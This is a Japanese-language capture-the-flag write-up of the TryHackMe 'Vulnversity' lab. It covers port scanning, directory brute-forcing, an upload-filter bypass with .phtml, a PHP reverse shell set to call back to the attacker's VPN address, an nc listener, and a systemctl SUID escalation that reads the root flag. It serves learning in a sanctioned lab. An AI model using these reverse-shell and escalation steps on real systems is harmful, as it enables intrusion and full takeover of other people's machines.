# Vulnversity

* 造語??

## Task2 Reconnaissance

```bash
root@ip-10-10-224-215:~# nmap 10.10.117.227

Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-30 02:39 BST
Nmap scan report for ip-10-10-117-227.eu-west-1.compute.internal (10.10.117.227)
Host is up (0.0011s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes
MAC Address: 02:F6:B3:82:B1:B7 (Unknown)
```

* What version of the squid proxy is running on the machine?
  * 3.5.12

```bash
root@ip-10-10-112-141:~# nmap -sV 10.10.216.75

Starting Nmap 7.60 ( https://nmap.org ) at 2022-06-01 15:05 BST
Nmap scan report for ip-10-10-216-75.eu-west-1.compute.internal (10.10.216.75)
Host is up (0.0011s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 02:D0:3E:70:83:B1 (Unknown)
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.83 seconds
```

* How many ports will nmap scan if the flag -p-400 was used?
  * 400

```bash
root@ip-10-10-112-141:~# nmap -p-400 10.10.216.75

Starting Nmap 7.60 ( https://nmap.org ) at 2022-06-01 15:08 BST
Nmap scan report for ip-10-10-216-75.eu-west-1.compute.internal (10.10.216.75)
Host is up (0.0011s latency).
Not shown: 397 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
MAC Address: 02:D0:3E:70:83:B1 (Unknown)
```

* Using the nmap flag -n what will it not resolve?
  * dns

```bash
root@ip-10-10-112-141:~# nmap -n 10.10.216.75

Starting Nmap 7.60 ( https://nmap.org ) at 2022-06-01 15:10 BST
Nmap scan report for 10.10.216.75
Host is up (0.0015s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes
MAC Address: 02:D0:3E:70:83:B1 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.61 seconds
```

* What is the most likely operating system this machine is running?
  * ubuntu

```bash
root@ip-10-10-112-141:~# nmap -A 10.10.216.75

Starting Nmap 7.60 ( https://nmap.org ) at 2022-06-01 15:15 BST
Nmap scan report for ip-10-10-216-75.eu-west-1.compute.internal (10.10.216.75)
Host is up (0.00080s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (EdDSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
MAC Address: 02:D0:3E:70:83:B1 (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.13
OS details: Linux 3.13
Network Distance: 1 hop
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2022-06-01T10:16:05-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-06-01 15:16:05
|_  start_date: 1600-12-31 23:58:45

TRACEROUTE
HOP RTT     ADDRESS
1   0.80 ms ip-10-10-216-75.eu-west-1.compute.internal (10.10.216.75)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.34 seconds
```

* What port is the web server running on?
  * 3333

## Task 3  Locating directories using GoBuster

Using a fast directory discovery tool called GoBuster you will 
locate a directory that you can use to upload a shell to.　　

* GoBuster
  * シェルをアップロードできるディレクトリを素早く見つけるツール
  * URIをBrute-forceする

* GitHubページ
  * 'https://github.com/OJ/gobuster'

* Go環境がないとインストールできない
  * バージョンが古くて簡易なインストールに対応していない

```bash
root@ip-10-10-112-141:~# sudo apt install golang-go
root@ip-10-10-112-141:~# go version
go version go1.10.4 linux/amd64
```

* (memo)めんどくさそうなのでopenvpnでmacから実施する

* macへのGO環境構築
  * 'https://zenn.dev/salvage0707/articles/go-settings-for-mac-2020-06'

  * インストール 

    ```mac
    brew install go
    keisukeigarashi@MacBook-Pro ~ % go version
    go version go1.18.2 darwin/arm64
    ```

  * 環境変数設定

    ```mac
    keisukeigarashi@MacBook-Pro ~ % go env GOPATH
    /Users/keisukeigarashi/go
    keisukeigarashi@MacBook-Pro ~ % export GOPATH=$(go env GOPATH)
    keisukeigarashi@MacBook-Pro ~ % export PATH=$PATH:$GOPATH:bin
    keisukeigarashi@MacBook-Pro ~ % source ~/.bashrc
    source: no such file or directory: /Users/keisukeigarashi/.bashrc
    keisukeigarashi@MacBook-Pro ~ % source ~/.bash_profile
    ```

  * gobusterのインストール

    ```mac
    brew install gobuster
    gobuster version
    ```
    
    →3.1をダウンロード

    * インストール先

    /opt/homebrew/Cellar/gobuster/3.1.0

    * 結構時間かけて悩んだけどkaliにgobuster標準でインストールされている。以下コマンドで見つける

    ```bash
    find / -name gobuster
    ```
    /usr/bin/gobusterにある。
    macにもインストールしたもののwordlistがなく断念。
    これって本来自分で作るもの？？

### オプション

![](/TryHackMe/OffensivePentesting/img/gobuster.png)

**What is the directory that has an upload form page?**

  * 

```bash
root@ip-10-10-170-163:/usr/share/wordlists# gobuster dir -u http://10.10.57.206:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.57.206:3333
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/06/04 14:27:15 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/internal (Status: 301)
===============================================================
2022/06/04 14:27:28 Finished
===============================================================
```

write upを見てしまったが、gobusterでは再帰的なフォルダ検索ができないとのことなので、write up通りにDirBusterをkaliで使ってみる。
tryhackmeのkaliにはなかったので（泣）vmwareのkaliで実行した。

vmwareのkaliで実行するにあたり、openvpn接続を前段でした。
```
sudo apt install openvpn
sudo openvpn /home/kali/Documents/K.Igarashi.ovpn 
```

![](/TryHackMe/OffensivePentesting/img/dirbuster_result.png)

uploadページが/internal/ディレクトリ配下で表示される。

![](/TryHackMe/OffensivePentesting/img/task3_result.png)

## Task4 Compromise the webserver 

compromize：情報漏洩、セキュリティ侵害

 * burpを利用してどのファイル拡張子なら行けそうかwordlistで調査するよう。kali側にはプロキシ設定が完了できていないため、windowsにopenvpnの設定をしwindows側からつないでリクエストをburpsuiteを動かすことにする。

 * yamlファイルをアップロードして取得したキャプチャがこちら


```
 POST /internal/index.php HTTP/1.1
Host: 10.10.86.33:3333
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------43970875423775698212854486962
Content-Length: 691
Origin: http://10.10.86.33:3333
Connection: close
Referer: http://10.10.86.33:3333/internal/
Upgrade-Insecure-Requests: 1

-----------------------------43970875423775698212854486962
Content-Disposition: form-data; name="file"; filename="docker-compose.yml"
Content-Type: application/octet-stream

version: "3"

services:
  uwsgi:
    build: ./app
    environment:
      TZ: "Asia/Tokyo"
  nginx:
    build: ./nginx
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf
#      - ./nginx/certs:/etc/nginx/certs
    links:
      - uwsgi
    ports:
       - "80:80"
#      - "443:443"
    environment:
      TZ: "Asia/Tokyo"

-----------------------------43970875423775698212854486962
Content-Disposition: form-data; name="submit"

Submit
-----------------------------43970875423775698212854486962--
```

![](/TryHackMe/OffensivePentesting/img/sendtointruder.png)

リストで総当たりしたい箇所をパラメータ化する
![](/TryHackMe/OffensivePentesting/img/intruder_param.png)

総当たりした結果（手入力で5つの拡張子を指定した）
![](/TryHackMe/OffensivePentesting/img/intruder_result.png)

### Try upload a few file types to the server, what common extension seems to be blocked? 

* .php

### Run this attack, what extension is allowed?

* .phtml

phtmlをアップロードできるということは、phpコードを実行できるということ。  
→この流れになぜなるのかが理解できず...

次にPHP reverse shellを実行する。リバースシェルはリモートホストから呼ばれることで発動する。シェルをアップロードし、待機する。
以下からphp-reverse-shellをダウンロードする。

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

* ipconfig /all でtun0(VPNの接続先IPアドレス）を指定する

```
PS C:\Users\nflabs-03\Documents\git\php-reverse-shell> ipconfig /all
不明なアダプター ローカル エリア接続 2:

   接続固有の DNS サフィックス . . . . .:
   説明. . . . . . . . . . . . . . . . .: TAP-Windows Adapter V9 for OpenVPN Connect
   物理アドレス. . . . . . . . . . . . .: 00-FF-E0-50-86-86
   DHCP 有効 . . . . . . . . . . . . . .: いいえ
   自動構成有効. . . . . . . . . . . . .: はい
   リンクローカル IPv6 アドレス. . . . .: fe80::d11f:9d64:bbce:58db%91(優先)
   IPv4 アドレス . . . . . . . . . . . .: 10.18.86.217(優先)
   サブネット マスク . . . . . . . . . .: 255.255.128.0
   デフォルト ゲートウェイ . . . . . . .:
   DHCPv6 IAID . . . . . . . . . . . . .: 1526792160
   DHCPv6 クライアント DUID. . . . . . .: 00-01-00-01-29-EF-C8-74-B8-31-B5-7A-CA-EF
   DNS サーバー. . . . . . . . . . . . .: fec0:0:0:ffff::1%1
                                          fec0:0:0:ffff::2%1
                                          fec0:0:0:ffff::3%1
   NetBIOS over TCP/IP . . . . . . . . .: 有効
```

* php-reverse-shell.phpのipを書き換える

'https://github.com/pentestmonkey/php-reverse-shell'

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.18.86.217';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

→【はまったポイント】リバースシェルでしていするIPアドレスは、あくまでもVPNのアドレスでよいことに
注意。kaliやwindowsのグローバルIPアドレス（同一のもの）はサーバーからは見えない。

* .phtmlにリネームする

* kaliでncコマンド実行

![](/TryHackMe/OffensivePentesting/img/nc%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89_listening1234.png)

* 4. Upload your shell and navigate to http://<ip>:3333/internal/uploads/php-reverse-shell.phtml - This will execute your payload

![](/TryHackMe/OffensivePentesting/img/upload_reverse_shell.png)

ここからphpをクリックすると4444にTCPでのコネクションがあり、シェルダッシュに
成功した。  
→【はまったポイント】Write upを見てアップロードした瞬間にリバーシシェルが動くものと勘違いしてしまっていて時間がかかった。phpが動作するサーバーでphp実行しないと動かない。

![](/TryHackMe/OffensivePentesting/img/wireshark_4444port.png)

```
──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.18.86.217] from (UNKNOWN) [10.10.192.214] 47054
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 04:33:43 up 19 min,  0 users,  load average: 0.00, 0.00, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

* -l : listen mode, for inbound connects
* -v : verbose [use twice to be more verbose]
* -n : numeric-only IP addresses, no DNS
* -p : port   local port number

* /etc/passwdを確認
![](/TryHackMe/OffensivePentesting/img/catetcpasswd.png)



* What is the name of the user who manages the webserver?
→bill

* What is the user flag?
→/home/bill/user.txtにあり

参考にしているwriteup
'https://tryhackme.com/resources/blog/vulnversit`

* On the system, search for all SUID files. What file stands out?

        * SUID
        'https://kazmax.zpp.jp/linux_beginner/setuserid.html'
        rwsとなる特殊なファイル。所有者でしか実行ができない

        bin/passwdなど

        writeupで実行しているコマンド
        ```
        find / -user root -perm -4000 -print 2>/dev/null


        * 答え
        /bin/systemctl

        ```
        $ ls -l /bin | grep rws
        -rwsr-xr-x 1 root root   30800 Jul 12  2016 fusermount
        -rwsr-xr-x 1 root root   40152 May 16  2018 mount
        -rwsr-xr-x 1 root root  142032 Jan 28  2017 ntfs-3g
        -rwsr-xr-x 1 root root   44168 May  7  2014 ping
        -rwsr-xr-x 1 root root   44680 May  7  2014 ping6
        -rwsr-xr-x 1 root root   40128 May 16  2017 su
        -rwsr-xr-x 1 root root  659856 Feb 13  2019 systemctl
        -rwsr-xr-x 1 root root   27608 May 16  2018 umount
        ```

* Become root and get the last flag (/root/root.txt)

        * これは基本なので必ず実施
        ```
        $ whoami ; id
        www-data
        uid=33(www-data) gid=33(www-data) groups=33(www-data)
        ```

        * systemctl
        初回のシステムを動かすためのバイナリ。
        デフォルトでsystemctlは/etc/system/systemdを探す。

        * 環境変数をセットしてroot権限を奪取する??

        'https://gtfobins.github.io/gtfobins/systemctl/#suid'

        The first thing we need to is create an environment variable!
        
        ```
        $ cd /opt
        $ priv=$(mktemp).service
        ```
        mktemp：適当なファイル名とつける

        Now we need to create a unit file and assign this to the environment variable.

        ```
        $ priv2=$(mktemp).service
        $ echo '[Service]
        > ExecStart=/bin/bash -c "cat /root/root.txt > /opt/flag"
        > [Install]
        > WantedBy=multi-user.target' > $priv2
        $ /bin/systemctl link $priv2
        Created symlink from /etc/systemd/system/tmp.pZm4HohZtZ.service to /tmp/tmp.pZm4HohZtZ.service.
        $ /bin/systemctl enable --now $priv2
        Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.pZm4HohZtZ.service to /tmp/tmp.pZm4HohZtZ.service.
        $ ls
        flag
        $ cat flag
        a58ff8579f0a9270368d33a9966c7fd5
        ```

        systemctlにサービス登録して実行する方法はぜひ覚える！
